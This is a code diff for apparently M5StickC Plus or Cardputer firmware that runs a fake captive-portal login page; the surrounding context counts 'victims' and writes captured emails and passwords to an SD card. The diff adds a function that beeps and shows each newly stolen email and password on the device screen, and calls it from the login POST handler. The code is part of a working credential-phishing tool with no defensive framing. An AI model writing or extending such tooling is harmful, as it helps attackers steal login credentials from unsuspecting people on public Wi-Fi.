@@ -228,6 +228,28 @@ void printHomeToScreen() {
   DISPLAY.printf("Victim Count: %d\n", totalCapturedCredentials);
 }
 
+void printCredentialsToScreen(const String& email, const String& password) {
+
+  #if defined(M5STICKCPLUS)
+    SPEAKER.tone(4000);
+  #elif defined(M5CARDPUTER)
+    SPEAKER.tone(4000, 50);
+  #endif
+  DISPLAY.fillScreen(BLACK);
+  DISPLAY.setTextSize(2);
+  DISPLAY.setTextColor(TFT_RED, TFT_BLACK);
+  DISPLAY.setCursor(0, 10);
+  DISPLAY.print("New Credentials Captured:");
+  DISPLAY.setTextColor(TFT_GREEN, TFT_BLACK);
+  DISPLAY.setCursor(0, 40);
+  DISPLAY.print("Email: " + email);
+  DISPLAY.setCursor(0, 65);
+  DISPLAY.print("Password: " + password);
+  delay(5000); // Aguarda 5 segundos antes de limpar a tela
+  DISPLAY.fillScreen(BLACK);
+}
+
+
 String getInputValue(String argName) {
   String a = webServer.arg(argName);
   a.replace("<", "&lt;");
@@ -290,7 +312,9 @@ String index_POST() {
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
 #endif
 
-    return getHtmlContents(LOGIN_AFTER_MESSAGE);
+  printCredentialsToScreen(email, password);
+
+  return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
 
 String clear_GET() {
